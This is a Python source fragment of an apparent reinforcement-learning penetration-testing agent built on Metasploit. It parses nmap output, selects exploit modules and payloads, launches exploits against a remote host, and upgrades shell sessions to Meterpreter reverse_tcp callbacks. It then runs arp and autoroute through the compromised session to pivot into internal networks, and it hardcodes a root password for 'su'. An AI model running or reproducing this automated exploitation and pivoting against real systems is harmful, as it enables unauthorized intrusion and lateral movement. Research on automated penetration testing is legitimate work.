            # Get port, protocol, information from XML file.
            port_list = []
            proto_list = []
            info_list = []
            bs = BeautifulSoup(nmap_result, 'lxml')
            ports = bs.find_all('port')
            for idx, port in enumerate(ports):
                port_list.append(str(port.attrs['portid']))
                proto_list.append(port.attrs['protocol'])

                for obj_child in port.contents:
                    if obj_child.name == 'service':
                        temp_info = ''
                        if 'product' in obj_child.attrs:
                            temp_info += obj_child.attrs['product'] + ' '
                        if 'version' in obj_child.attrs:
                            temp_info += obj_child.attrs['version'] + ' '
                        if 'extrainfo' in obj_child.attrs:
                            temp_info += obj_child.attrs['extrainfo']
                        if temp_info != '':
                            info_list.append(temp_info)
                        else:
                            info_list.append('unknown')
                # Display getting port information.
                self.util.print_message(OK, 'Getting {}/{} info: {}'.format(str(port.attrs['portid']),
                                                                            port.attrs['protocol'],
                                                                            info_list[idx]))

            if len(port_list) == 0:
                self.util.print_message(WARNING, 'No open port.')
                self.util.print_message(WARNING, 'Shutdown Deep Exploit...')
                self.client.termination(self.client.console_id)
                exit(1)

            # Update com_port_list.
            com_port_list = port_list

            # Get OS name from XML file.
            some_os = bs.find_all('osmatch')
            os_name = 'unknown'
            for obj_os in some_os:
                for obj_child in obj_os.contents:
                    if obj_child.name == 'osclass' and 'osfamily' in obj_child.attrs:
                        os_name = (obj_child.attrs['osfamily']).lower()
                        break

            # Set OS to state.
            for (idx, os_type) in enumerate(self.os_type):
                if os_name in os_type:
                    self.os_real = idx
        else:
            # Get target host information from local file.
            saved_file = os.path.join(self.data_path, 'target_info_' + rhost + '.json')
            self.util.print_message(OK, 'Loaded target tree from : {}'.format(saved_file))
            fin = codecs.open(saved_file, 'r', 'utf-8')
            target_tree = json.loads(fin.read().replace('\0', ''))
            fin.close()
            key_list = list(target_tree.keys())
            for key in key_list[2:]:
                port_list.append(str(key))

            # Update com_port_list.
            com_port_list = port_list

        return port_list, proto_list, info_list

    # Get Exploit module list.
    def get_exploit_list(self):
        self.util.print_message(NOTE, 'Get exploit list.')
        all_exploit_list = []
        if os.path.exists(os.path.join(self.data_path, 'exploit_list.csv')) is False:
            self.util.print_message(OK, 'Loading exploit list from Metasploit.')

            # Get Exploit module list.
            all_exploit_list = []
            exploit_candidate_list = self.client.get_module_list('exploit')
            for idx, exploit in enumerate(exploit_candidate_list):
                module_info = self.client.get_module_info('exploit', exploit)
                time.sleep(0.1)
                try:
                    rank = module_info[b'rank'].decode('utf-8')
                    if rank in {'excellent', 'great', 'good'}:
                        all_exploit_list.append(exploit)
                        self.util.print_message(OK, '{}/{} Loaded exploit: {}'.format(str(idx + 1),
                                                                                      len(exploit_candidate_list),
                                                                                      exploit))
                    else:
                        self.util.print_message(WARNING, '{}/{} {} module is danger (rank: {}). Can\'t load.'
                                                .format(str(idx + 1), len(exploit_candidate_list), exploit, rank))
                except Exception as e:
                    self.util.print_exception(e, 'Failed: module.info')
                    exit(1)

            # Save Exploit module list to local file.
            self.util.print_message(OK, 'Total loaded exploit module: {}'.format(str(len(all_exploit_list))))
            fout = codecs.open(os.path.join(self.data_path, 'exploit_list.csv'), 'w', 'utf-8')
            for item in all_exploit_list:
                fout.write(item + '\n')
            fout.close()
            self.util.print_message(OK, 'Saved exploit list.')
        else:
            # Get exploit module list from local file.
            local_file = os.path.join(self.data_path, 'exploit_list.csv')
            self.util.print_message(OK, 'Loaded exploit list from : {}'.format(local_file))
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                all_exploit_list.append(item.rstrip('\n'))
            fin.close()
        return all_exploit_list

    # Get payload list.
    def get_payload_list(self, module_name='', target_num=''):
        self.util.print_message(NOTE, 'Get payload list.')
        all_payload_list = []
        if os.path.exists(os.path.join(self.data_path, 'payload_list.csv')) is False or module_name != '':
            self.util.print_message(OK, 'Loading payload list from Metasploit.')

            # Get payload list.
            payload_list = []
            if module_name == '':
                # Get all Payloads.
                payload_list = self.client.get_module_list('payload')

                # Save payload list to local file.
                fout = codecs.open(os.path.join(self.data_path, 'payload_list.csv'), 'w', 'utf-8')
                for idx, item in enumerate(payload_list):
                    time.sleep(0.1)
                    self.util.print_message(OK, '{}/{} Loaded payload: {}'.format(str(idx + 1),
                                                                                  len(payload_list),
                                                                                  item))
                    fout.write(item + '\n')
                fout.close()
                self.util.print_message(OK, 'Saved payload list.')
            elif target_num == '':
                # Get payload that compatible exploit module.
                payload_list = self.client.get_compatible_payload_list(module_name)
            else:
                # Get payload that compatible target.
                payload_list = self.client.get_target_compatible_payload_list(module_name, target_num)
        else:
            # Get payload list from local file.
            local_file = os.path.join(self.data_path, 'payload_list.csv')
            self.util.print_message(OK, 'Loaded payload list from : {}'.format(local_file))
            payload_list = []
            fin = codecs.open(local_file, 'r', 'utf-8')
            for item in fin:
                payload_list.append(item.rstrip('\n'))
            fin.close()
        return payload_list
    
    def step(self, s, a, exploit_tree, target_tree):
      #  print(a)
        if 'Exploit!' in str(s):
          #  print(s)
            target = 'Target!:' + str(a)
          #  print(a)
            s.append(target)
          #  print(s)
            r = -1
            done = False
            port = s[1]
            port_num = port.replace('PORT!:', '')
          #  print(port_num)
            service = s[2]
            service_name = service.replace('service', '')
            module = s[5]
            module_name = module.replace('Exploit!', '')
            
            module_name = module_name[9:]
          #  print(module_name)
            payload_list = exploit_tree[module_name]['targets'][a]
          #  print(payload_list)
            target_info = {'protocol': target_tree[port_num]['protocol'],
                       'target_path': target_tree[port_num]['target_path'], 'prod_name': service_name,
                       'version': target_tree[port_num]['version'], 'exploit': module_name}
                       
            if com_indicate_flag:
               port_num = target_tree['origin_port']
            target_info['port'] = str(port_num)
          #  print(target_info)
            
            return s, payload_list, r, done, target_info
            
        elif 'PORT!:' in str(s):
             exploit = 'Exploit!:' + str(a)
           #  print(exploit)
           #  a = str(a)
             s.append(exploit)
             module_name = a[8:]
           #  print(module_name)
             target_list = exploit_tree[module_name]['target_list']
             r = -1
             done = False
             target_info = ''
             return s, target_list, r, done, target_info
        
        else:
            port = 'PORT!:' + str(a)
          #  print(a)
            s.append(port)
          #  a = str(a)
            service_name = target_tree[a]['prod_name']
            if service_name == 'unknown':
               return s, 'None', -10, True, None
            service = 'service:' + service_name
            s.append(service)
            version = target_tree[a]['version']
            version = 'version:' + str(version)
            s.append(version)
          #  os = 'OS:' + str(target_tree['os_type'])
            os = 'OS:' + 'Linux'
            s.append(os)            
            module_list = target_tree[a]['exploit']
          #  print(module_list)
            r = -1
            done = False
            target_info = ''
          #  print(s)
            return s, module_list, r, done, target_info
    
  #  def reset_state2(self, exploit_tree, target_tree): 
      #  self.state = [] 
    #    nmap_result = []      
     #   p = pexpect.spawn('msfconsole')
       # p.expect("$")
  #      p.sendline("nmap 192.168.56.101")
     #   s1 = p.before.decode(encoding='utf-8') 
   #     print(s1) 
      #  import nmap3
     #   nmap = nmap3.NmapHostDiscovery()
      #  results = nmap.nmap_portscan_only("172.17.0.9")
	#print(results['192.168.56.101']['ports'])
   #     x = results['172.17.0.9']['ports']

    #    for i in x:
            # print(i['portid'])
           #  nmap_result.append(i['portid'])
     #   nmap_portscan = str(nmap_result)
      #  self.state.append(nmap_portscan)
        
        
        
     #   return False, self.state, com_port_list
    
    
    def reset_state2(self, exploit_tree, target_tree): 
        self.state = [] 
        nmap_result = [] 
        
        p = pexpect.spawn('su')
        p.expect("Password:")
        p.sendline("HAFSuyAc6FVq")
        p.expect("#")
        p.sendline("nmap 172.17.0.3")
        p.expect('#')
        s1 = p.before.decode(encoding='utf-8') 
     #   print(s1) 
        self.state.append(s1)
      #  import nmap3
    #    nmap = nmap3.NmapHostDiscovery()
       # results = nmap.nmap_portscan_only("172.17.0.3")
     #   print(results['172.17.0.3']['ports'])
   #     x = results['172.17.0.3']
    #    print(x)
   #     for i in x:
       #     if i['state'] == "filtered":
          #     print("filtered")
             #print(i['state'])
             
       #     else:
            
         #        nmap_result.append(i['portid'])
    #    nmap_portscan = str(nmap_result)
       # print(nmap_portscan)
    #    self.state.append(nmap_portscan)
        
        
        
        return False, self.state, com_port_list
            
    # Reset state (s).
    def reset_state(self, exploit_tree, target_tree):
        # Randomly select target port number.
      #  print(target_tree)
        port_num = str(com_port_list[random.randint(0, len(com_port_list) - 1)])
        service_name = target_tree[port_num]['prod_name']
        if service_name == 'unknown':
            return True, None, None, None, None

        # Initialize state.
        self.state = []
       # self.state2 = []

        # Set os type to state.
        self.os_real = target_tree['os_type']
      #  print(self.os_real)
        self.state.insert(ST_OS_TYPE, target_tree['os_type'])
       # self.state2.insert(ST_OS_TYPE, target_tree['os_type'])
        self.normalization(ST_OS_TYPE)

        # Set product name (index) to state.
        for (idx, service) in enumerate(self.service_list):
            if service == service_name:
              #  self.state.insert(ST_SERV_NAME, idx)
                self.state.insert(ST_SERV_NAME, service)
                break
      #  self.normalization(ST_SERV_NAME)

        # Set version to state.
     #   self.state.insert(ST_SERV_VER, target_tree[port_num]['version'])
        self.state.insert(ST_SERV_VER, target_tree[port_num]['version'])

        # Set exploit module type (index) to state.
        module_list = target_tree[port_num]['exploit']

        # Randomly select exploit module.
        module_name = ''
        module_info = []
        
        while True:
            module_name = module_list[random.randint(0, len(module_list) - 1)]
            for (idx, exploit) in enumerate(com_exploit_list):
                exploit = 'exploit/' + exploit
                
              #  print(exploit)
                if exploit == module_name:
                    print(exploit)
                  #  self.state.insert(ST_MODULE, idx)
                    self.state.insert(ST_MODULE, exploit)
                    break
           # self.normalization(ST_MODULE)
            break

        # Randomly select target.
        module_name = module_name[8:]
        target_list = exploit_tree[module_name]['target_list']
        targets_num = target_list[random.randint(0, len(target_list) - 1)]
      #  self.state.insert(ST_TARGET, int(targets_num))
        self.state.insert(ST_TARGET, int(targets_num))

        # Set exploit stage to state.
        # self.state.insert(ST_STAGE, S_NORMAL)

        # Set target information for display.
        target_info = {'protocol': target_tree[port_num]['protocol'],
                       'target_path': target_tree[port_num]['target_path'], 'prod_name': service_name,
                       'version': target_tree[port_num]['version'], 'exploit': module_name}
        if com_indicate_flag:
            port_num = target_tree['origin_port']
        target_info['port'] = str(port_num)
      #  print(self.state)
        return False, self.state, exploit_tree[module_name]['targets'][targets_num], target_list, target_info

    # Get state (s).
    def get_state(self, exploit_tree, target_tree, port_num, exploit, target):
        # Get product name.
        service_name = target_tree[port_num]['prod_name']
        if service_name == 'unknown':
            return True, None, None, None

        # Initialize state.
        self.state = []

        # Set os type to state.
        self.os_real = target_tree['os_type']
        print(self.os_real)
        self.state.insert(ST_OS_TYPE, target_tree['os_type'])
        self.normalization(ST_OS_TYPE)

        # Set product name (index) to state.
        for (idx, service) in enumerate(self.service_list):
            if service == service_name:
                self.state.insert(ST_SERV_NAME, idx)
                break
        self.normalization(ST_SERV_NAME)

        # Set version to state.
        self.state.insert(ST_SERV_VER, target_tree[port_num]['version'])

        # Select exploit module (index).
        for (idx, temp_exploit) in enumerate(com_exploit_list):
            temp_exploit = 'exploit/' + temp_exploit
            if exploit == temp_exploit:
                self.state.insert(ST_MODULE, idx)
                break
        self.normalization(ST_MODULE)

        # Select target.
        self.state.insert(ST_TARGET, int(target))

        # Set exploit stage to state.
        # self.state.insert(ST_STAGE, S_NORMAL)

        # Set target information for display.
        target_info = {'protocol': target_tree[port_num]['protocol'],
                       'target_path': target_tree[port_num]['target_path'],
                       'prod_name': service_name, 'version': target_tree[port_num]['version'],
                       'exploit': exploit[8:], 'target': target}
        if com_indicate_flag:
            port_num = target_tree['origin_port']
        target_info['port'] = str(port_num)
        print(self.state)
        return False, self.state, exploit_tree[exploit[8:]]['targets'][target], target_info

    # Get available payload list (convert from string to number).
    def get_available_actions(self, payload_list):
        payload_num_list = []
        payload_list2 = []
        for self_payload in payload_list:
            for (idx, payload) in enumerate(com_payload_list):
                if payload == self_payload:
                    payload_num_list.append(idx)
                    payload_list2.append(payload)
                   # print(payload)
                    break
        return payload_num_list, payload_list2

    # Show banner of successfully exploitation.
    def show_banner_bingo(self, prod_name, exploit, payload, sess_type, delay_time=2.0):
        banner = u"""
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
	　　　           ■                
		 ■■■■ ■ ■ ■       ■      
		 ■  ■ ■■■        ■■ ■■   
		 ■  ■■■■■■■■   ■■■■■■    
		 ■■■■  ■ ■       ■       
		 ■  ■■■■■■■■     ■       
		 ■  ■ ■   ■■    ■ ■■■■■  
		 ■■■■■■■■■■■    ■■■   ■■ 
		 ■  ■  ■  ■            ■ 
		 ■  ■  ■  ■           ■■ 
		 ■  ■ ■   ■       ■■■■   
		   ■    ■■■              　　　　　　　　　　　
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
        """ + prod_name + ' ' + exploit + ' ' + payload + ' ' + sess_type + '\n'
        self.util.print_message(NONE, banner)
        time.sleep(delay_time)

    # Set Metasploit options.
    def set_options(self, target_info, target, selected_payload, exploit_tree):
        options = exploit_tree[target_info['exploit']]['options']
        key_list = options.keys()
        option = {}
        for key in key_list:
            if options[key]['required'] is True:
                sub_key_list = options[key].keys()
                if 'default' in sub_key_list:
                    # If "user_specify" is not null, set "user_specify" value to the key.
                    if options[key]['user_specify'] == '':
                        option[key] = options[key]['default']
                    else:
                        option[key] = options[key]['user_specify']
                else:
                    option[key] = '0'

            # Set target path/uri/dir etc.
            if len([s for s in self.path_collection if s in key.lower()]) != 0:
                option[key] = target_info['target_path']

        option['RHOST'] = self.rhost
        if self.port_div_symbol in target_info['port']:
            tmp_port = target_info['port'].split(self.port_div_symbol)
            option['RPORT'] = int(tmp_port[0])
        else:
            option['RPORT'] = int(target_info['port'])
        option['TARGET'] = int(target)
        if selected_payload != '':
            option['PAYLOAD'] = selected_payload
        return option

    # Execute exploit.
    def execute_exploit(self, s, action, thread_name, thread_type, target_list, target_info, step, exploit_tree, frame=0):
        # Set target.
        target = ''
        if thread_type == 'learning':
            target = s[6]
            target = target.replace('Target!:', '')
           # target = str(self.state[ST_TARGET])
        else:
            # If testing, 'target_list' is target number (not list).
            target = target_list
            # If trial exceed maximum number of trials, finish trial at current episode.
            if step > self.max_attempt - 1:
                return self.state, None, True, {}

        # Set payload.
        selected_payload = ''
        if action != 'no payload':
           # selected_payload = com_payload_list[action]
            selected_payload = action
        else:
            # No payload
            selected_payload = ''

        # Set options.
        option = self.set_options(target_info, target, selected_payload, exploit_tree)
      #  print(option)
        # Execute exploit.
        reward = 0
        message = ''
        session_list = {}
        done = False
        print(target_info['exploit'])
        job_id, uuid = self.client.execute_module('exploit', target_info['exploit'], option)
        if uuid is not None:
            # Check status of running module.
            _ = self.check_running_module(job_id, uuid)
            sessions = self.client.get_session_list()
            key_list = sessions.keys()
            if len(key_list) != 0:
                # Probably successfully of exploitation (but unsettled).
                for key in key_list:
                    exploit_uuid = sessions[key][b'exploit_uuid'].decode('utf-8')
                    if uuid == exploit_uuid:
                        # Successfully of exploitation.
                        session_id = int(key)
                        session_type = sessions[key][b'type'].decode('utf-8')
                        session_port = str(sessions[key][b'session_port'])
                        session_exploit = sessions[key][b'via_exploit'].decode('utf-8')
                        session_payload = sessions[key][b'via_payload'].decode('utf-8')
                        module_info = self.client.get_module_info('exploit', session_exploit)

                        # Checking feasibility of post-exploitation.
                        # status, server_job_id, new_session_id = self.check_post_exploit(session_id, session_type)
                        # status = self.check_payload_type(session_payload, session_type)
                        status = True

                        if status:
                            # Successful of post-exploitation.
                            reward = R_GREAT
                            done = True
                            message = 'bingo!! '

                            # Display banner.
                            self.show_banner_bingo(target_info['prod_name'],
                                                   session_exploit,
                                                   session_payload,
                                                   session_type)
                        else:
                            # Failure of post-exploitation.
                            reward = R_GOOD
                            message = 'misfire '

                        # Gather reporting items.
                        vuln_name = module_info[b'name'].decode('utf-8')
                        description = module_info[b'description'].decode('utf-8')
                        ref_list = module_info[b'references']
                        reference = ''
                        for item in ref_list:
                            reference += '[' + item[0].decode('utf-8') + ']' + '@' + item[1].decode('utf-8') + '@@'

                        # Save reporting item for report.
                        if thread_type == 'learning':
                            with codecs.open(os.path.join(self.report_train_path,
                                                          thread_name + '.csv'), 'a', 'utf-8') as fout:
                                bingo = [self.util.get_current_date(),
                                         self.rhost,
                                         session_port,
                                         target_info['protocol'],
                                         target_info['prod_name'],
                                         str(target_info['version']),
                                         vuln_name,
                                         description,
                                         session_type,
                                         session_exploit,
                                         target,
                                         session_payload,
                                         reference]
                                writer = csv.writer(fout)
                                writer.writerow(bingo)
                        else:
                            with codecs.open(os.path.join(self.report_test_path,
                                                          thread_name + '.csv'), 'a', 'utf-8') as fout:
                                bingo = [self.util.get_current_date(),
                                         self.rhost,
                                         session_port,
                                         self.source_host,
                                         target_info['protocol'],
                                         target_info['prod_name'],
                                         str(target_info['version']),
                                         vuln_name,
                                         description,
                                         session_type,
                                         session_exploit,
                                         target,
                                         session_payload,
                                         reference]
                                writer = csv.writer(fout)
                                writer.writerow(bingo)

                        # Shutdown multi-handler for post-exploitation.
                        # if server_job_id is not None:
                        #     self.client.stop_job(server_job_id)

                        # Disconnect session.
                        if thread_type == 'learning':
                            self.client.stop_session(session_id)
                            # self.client.stop_session(new_session_id)
                            self.client.stop_meterpreter_session(session_id)
                            # self.client.stop_meterpreter_session(new_session_id)
                        # Create session list for post-exploitation.
                        else:
                            # self.client.stop_session(new_session_id)
                            # self.client.stop_meterpreter_session(new_session_id)
                            session_list['id'] = session_id
                            session_list['type'] = session_type
                            session_list['port'] = session_port
                            session_list['exploit'] = session_exploit
                            session_list['target'] = target
                            session_list['payload'] = session_payload
                        break
                else:
                    # Failure exploitation.
                    reward = R_BAD
                    message = 'failure '
            else:
                # Failure exploitation.
                reward = R_BAD
                message = 'failure '
        else:
            # Time out or internal error of Metasploit.
            done = True
            reward = R_BAD
            message = 'time out'

        # Output result to console.
        if thread_type == 'learning':
            self.util.print_message(OK, '{0:04d}/{1:04d} : {2:03d}/{3:03d} {4} reward:{5} {6} {7} ({8}/{9}) '
                                        '{10} | {11} | {12} | {13}'.format(frame,
                                                                           MAX_TRAIN_NUM,
                                                                           step,
                                                                           MAX_STEPS,
                                                                           thread_name,
                                                                           str(reward),
                                                                           message,
                                                                           self.rhost,
                                                                           target_info['protocol'],
                                                                           target_info['port'],
                                                                           target_info['prod_name'],
                                                                           target_info['exploit'],
                                                                           selected_payload,
                                                                           target))
        else:
            self.util.print_message(OK, '{0}/{1} {2} {3} ({4}/{5}) '
                                        '{6} | {7} | {8} | {9}'.format(step+1,
                                                                       self.max_attempt,
                                                                       message,
                                                                       self.rhost,
                                                                       target_info['protocol'],
                                                                       target_info['port'],
                                                                       target_info['prod_name'],
                                                                       target_info['exploit'],
                                                                       selected_payload,
                                                                       target))

        # Set next stage of exploitation.
        targets_num = 0
     #   print(self.state)
      #  if thread_type == 'learning' and len(target_list) != 0:
          #  targets_num = random.randint(0, len(target_list) - 1)
      #  self.state[ST_TARGET] = targets_num
       # self.state2[ST_TARGET] = targets_num
      #  print(targets_num)
        '''
        if thread_type == 'learning' and len(target_list) != 0:
            if reward == R_BAD and self.state[ST_STAGE] == S_NORMAL:
                # Change status of target.
                self.state[ST_TARGET] = random.randint(0, len(target_list) - 1)
            elif reward == R_GOOD:
                # Change status of exploitation stage (Fix target).
                self.state[ST_STAGE] = S_EXPLOIT
            else:
                # Change status of post-exploitation stage (Goal).
                self.state[ST_STAGE] = S_PEXPLOIT
        '''

        return self.state, reward, done, session_list

    # Check possibility of post exploit.
    def check_post_exploit(self, session_id, session_type):
        new_session_id = 0
        status = False
        job_id = None
        if session_type == 'shell' or session_type == 'powershell':
            # Upgrade session from shell to meterpreter.
            upgrade_result, job_id, lport = self.upgrade_shell(session_id)
            if upgrade_result == 'success':
                sessions = self.client.get_session_list()
                session_list = list(sessions.keys())
                for sess_idx in session_list:
                    if session_id < sess_idx and sessions[sess_idx][b'type'].lower() == b'meterpreter':
                        status = True
                        new_session_id = sess_idx
                        break
            else:
                status = False
        elif session_type == 'meterpreter':
            status = True
        else:
            status = False
        return status, job_id, new_session_id

    # Check payload type.
    def check_payload_type(self, session_payload, session_type):
        status = None
        if session_type == 'shell' or session_type == 'powershell':
            # Check type: singles, stagers, stages
            if session_payload.count('/') > 1:
                # Stagers, Stages.
                status = True
            else:
                # Singles.
                status = False
        elif session_type == 'meterpreter':
            status = True
        else:
            status = False
        return status

    # Execute post exploit.
    def execute_post_exploit(self, session_id, session_type):
        internal_ip_list = []
        if session_type == 'shell' or session_type == 'powershell':
            # Upgrade session from shell to meterpreter.
            upgrade_result, _, _ = self.upgrade_shell(session_id)
            if upgrade_result == 'success':
                sessions = self.client.get_session_list()
                session_list = list(sessions.keys())
                for sess_idx in session_list:
                    if session_id < sess_idx and sessions[sess_idx][b'type'].lower() == b'meterpreter':
                        self.util.print_message(NOTE, 'Successful: Upgrade.')
                        session_id = sess_idx

                        # Search other servers in internal network.
                        internal_ip_list, _ = self.get_internal_ip(session_id)
                        if len(internal_ip_list) == 0:
                            self.util.print_message(WARNING, 'Internal server is not found.')
                        else:
                            # Pivoting.
                            self.util.print_message(OK, 'Internal server list.\n{}'.format(internal_ip_list))
                            self.set_pivoting(session_id, internal_ip_list)
                        break
            else:
                self.util.print_message(WARNING, 'Failure: Upgrade session from shell to meterpreter.')
        elif session_type == 'meterpreter':
            # Search other servers in internal network.
            internal_ip_list, _ = self.get_internal_ip(session_id)
            if len(internal_ip_list) == 0:
                self.util.print_message(WARNING, 'Internal server is not found.')
            else:
                # Pivoting.
                self.util.print_message(OK, 'Internal server list.\n{}'.format(internal_ip_list))
                self.set_pivoting(session_id, internal_ip_list)
        else:
            self.util.print_message(WARNING, 'Unknown session type: {}.'.format(session_type))
        return internal_ip_list

    # Upgrade session from shell to meterpreter.
    def upgrade_shell(self, session_id):
        # Upgrade shell session to meterpreter.
        self.util.print_message(NOTE, 'Upgrade session from shell to meterpreter.')
        payload = ''
        # TODO: examine payloads each OS systems.
        if self.os_real == 0:
            payload = 'windows/meterpreter/reverse_tcp'
        elif self.os_real == 3:
            payload = 'osx/x64/meterpreter_reverse_tcp'
        else:
            payload = 'linux/x86/meterpreter_reverse_tcp'

        # Launch multi handler.
        module = 'exploit/multi/handler'
        lport = random.randint(10001, 65535)
        option = {'LHOST': self.lhost, 'LPORT': lport, 'PAYLOAD': payload, 'TARGET': 0}
        job_id, uuid = self.client.execute_module('exploit', module, option)
        time.sleep(0.5)
        if uuid is None:
            self.util.print_message(FAIL, 'Failure executing module: {}'.format(module))
            return 'failure', job_id, lport

        # Execute upgrade.
        status = self.client.upgrade_shell_session(session_id, self.lhost, lport)
        return status, job_id, lport

    # Check status of running module.
    def check_running_module(self, job_id, uuid):
        # Waiting job to finish.
        time_count = 0
        while True:
            job_id_list = self.client.get_job_list()
            if job_id in job_id_list:
                time.sleep(1)
            else:
                return True
            if self.timeout == time_count:
                self.client.stop_job(str(job_id))
                self.util.print_message(WARNING, 'Timeout: job_id={}, uuid={}'.format(job_id, uuid))
                return False
            time_count += 1

    # Get internal ip addresses.
    def get_internal_ip(self, session_id):
        # Execute "arp" of Meterpreter command.
        self.util.print_message(OK, 'Searching internal servers...')
        cmd = 'arp\n'
        _ = self.client.execute_meterpreter(session_id, cmd)
        time.sleep(3.0)
        data = self.client.get_meterpreter_result(session_id)
        if (data is None) or ('unknown command' in data.lower()):
            self.util.print_message(FAIL, 'Failed: Get meterpreter result')
            return [], False
        self.util.print_message(OK, 'Result of arp: \n{}'.format(data))
        regex_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}).*[a-z0-9]{2}:[a-z0-9]{2}:[a-z0-9]{2}:[a-z0-9]{2}'
        temp_list = self.cutting_strings(regex_pattern, data)
        internal_ip_list = []
        for ip_addr in temp_list:
            if ip_addr != self.lhost:
                internal_ip_list.append(ip_addr)
        return list(set(internal_ip_list)), True

    # Get subnet masks.
    def get_subnet(self, session_id, internal_ip):
        cmd = 'run get_local_subnets\n'
        _ = self.client.execute_meterpreter(session_id, cmd)
        time.sleep(3.0)
        data = self.client.get_meterpreter_result(session_id)
        if data is not None:
            self.util.print_message(OK, 'Result of get_local_subnets: \n{}'.format(data))
            regex_pattern = r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
            temp_subnet = self.cutting_strings(regex_pattern, data)
            try:
                subnets = temp_subnet[0].split('/')
                return [subnets[0], subnets[1]]
            except Exception as e:
                self.util.print_exception(e, 'Failed: {}'.format(cmd))
                return ['.'.join(internal_ip.split('.')[:3]) + '.0', '255.255.255.0']
        else:
            self.util.print_message(WARNING, '"{}" is failure.'.format(cmd))
            return ['.'.join(internal_ip.split('.')[:3]) + '.0', '255.255.255.0']

    # Set pivoting using autoroute.
    def set_pivoting(self, session_id, ip_list):
        # Get subnet of target internal network.
        temp_subnet = []
        for internal_ip in ip_list:
            # Execute an autoroute command.
            temp_subnet.append(self.get_subnet(session_id, internal_ip))

        # Execute autoroute.
        for subnet in list(map(list, set(map(tuple, temp_subnet)))):
            cmd = 'run autoroute -s ' + subnet[0] + ' ' + subnet[1] + '\n'
            _ = self.client.execute_meterpreter(session_id, cmd)
            time.sleep(3.0)
            _ = self.client.execute_meterpreter(session_id, 'run autoroute -p\n')


# Constants of LocalBrain
MIN_BATCH = 5
LOSS_V = .5  # v loss coefficient
LOSS_ENTROPY = .01  # entropy coefficient
LEARNING_RATE = 5e-3
RMSPropDecaly = 0.99

# Params of advantage (Bellman equation)
GAMMA = 0.99
N_STEP_RETURN = 5
GAMMA_N = GAMMA ** N_STEP_RETURN

TRAIN_WORKERS = 1  # Thread number of learning.
TEST_WORKER = 1  # Thread number of testing (default 1)
MAX_STEPS = 3  # Maximum step number.
MAX_TRAIN_NUM = 5000 # Learning number of each thread.
Tmax = 5  # Updating step period of each thread.

# Params of epsilon greedy
EPS_START = 0.5
EPS_END = 0.0






# LocalBrain
class CommandScorer(nn.Module):
    def __init__(self, input_size, hidden_size):
        super(CommandScorer, self).__init__()
        torch.manual_seed(42)  # For reproducibility
        self.state_value = []
        self.label_list = []
        self.max_len = 200
        self.embedding    = nn.Embedding(input_size, hidden_size)
      #  self.encoder_gru  = nn.GRU(hidden_size, hidden_size, bidirectional=True)
        self.encoder_model = GTrXL(
                     d_model=512,
                     nheads=4,
                     transformer_layers=1
                    )
        self.cmd_encoder_gru  = nn.GRU(hidden_size, hidden_size)
        self.state_gru    = nn.GRU(hidden_size*self.max_len, hidden_size)
        self.hidden_size  = hidden_size
        self.linear_size = hidden_size
        self.state_hidden = torch.zeros(1, 1, hidden_size, device=device)
        self.critic       = nn.Sequential(nn.Linear(self.linear_size, self.linear_size),nn.ReLU(),nn.Linear(self.linear_size, 1))#nn.Linear(hidden_size, 1)
        self.att_cmd      = nn.Sequential(nn.Linear(self.linear_size*2, self.linear_size*2), nn.ReLU(), nn.Linear(self.linear_size*2, 1))#nn.Linear(hidden_size * 2, 1)
     #   self.download_path = snapshot_download(repo_id="jackaduma/SecRoBERTa")
       # self.model = "jackaduma/SecBERT"
     #   self.model_config = AutoConfig.from_pretrained(self.download_path, output_hidden_states=True)
   #     self.model2 = AutoModelForMaskedLM.from_pretrained(self.download_path, config=self.model_config)
      #  self.model2 = self.model2.cuda()
        
        
    def forward(self, obs, commands, **kwargs):
      #  input_length = obs.size(0)
        batch_size = obs.size(1)
        batch_size = 1
        nb_cmds = commands.size(1)
        
       # embedded = self.model2.get_input_embeddings()
      #  print(obs)
        embedded = self.embedding(obs)
      #  print(embedded)
        encoder_hidden = self.encoder_model(embedded)
        print(encoder_hidden.shape)
        encoder_hidden = torch.reshape(encoder_hidden,(1,1,self.hidden_size*self.max_len))
      #  encoder_hidden = self.model2(**obs)
    #    encoder_hidden = encoder_hidden.hidden_states[-1]
      #  encoder_hidden2 = encoder_hidden
    #    encoder_hidden = torch.reshape(encoder_hidden ,(1,1,384000))
      #  encoder_hidden2 = encoder_hidden
     #   encoder_hidden2 = encoder_hidden2.to('cpu').detach().numpy().copy()
    #    print(encoder_hidden2.shape)
      #  encoder_hidden2 = encoder_hidden2.squeeze()
    #    encoder_hidden2d = TSNE(n_components=2).fit_transform(encoder_hidden2)
      #  print(encoder_hidden2d)
     #   self.state_value.append(encoder_hidden2)
       # 197376
     #   print(encoder_hidden.shape)
        state_output, state_hidden = self.state_gru(encoder_hidden, self.state_hidden)
        encoder_hidden2 = state_output
        encoder_hidden2 = encoder_hidden2.to('cpu').detach().numpy().copy()
        self.state_value.append(encoder_hidden2)
     #   print(state_output.shape)
        self.state_hidden = state_hidden
        value = self.critic(state_output)
    #    state_output2d = TSNE(n_components=2).fit_transform(state_output)
     #   self.state_value.append(encoder_hidden2d)
        value_numpy = value.to('cpu').detach().numpy().copy()
        value_numpy = value_numpy.flatten()
        value_numpy = value_numpy.tolist()
        value_numpy = value_numpy[0]

        self.label_list.append(value_numpy)
      #  print(self.label_list)
       # f = open('valueredchefEX5.txt', 'a', encoding='UTF-8') 
       # f.write(str(value)+'\n')
      #  f.close()
        # Attention network over the commands.
        cmds_embedding = self.embedding.forward(commands)
        _, cmds_encoding_last_states = self.cmd_encoder_gru.forward(cmds_embedding)  # 1 x cmds x hidden

        # Same observed state for all commands.
        cmd_selector_input = torch.stack([state_hidden] * nb_cmds, 2)  # 1 x batch x cmds x hidden

        # Same command choices for the whole batch.
        cmds_encoding_last_states = torch.stack([cmds_encoding_last_states] * batch_size, 1)  # 1 x batch x cmds x hidden

        # Concatenate the observed state and command encodings.
        cmd_selector_input = torch.cat([cmd_selector_input, cmds_encoding_last_states], dim=-1)

        # Compute one score per command.
        scores = self.att_cmd(cmd_selector_input).squeeze(-1)  # 1 x Batch x cmds
        
        probs = F.softmax(scores, dim=2)  # 1 x Batch x cmds
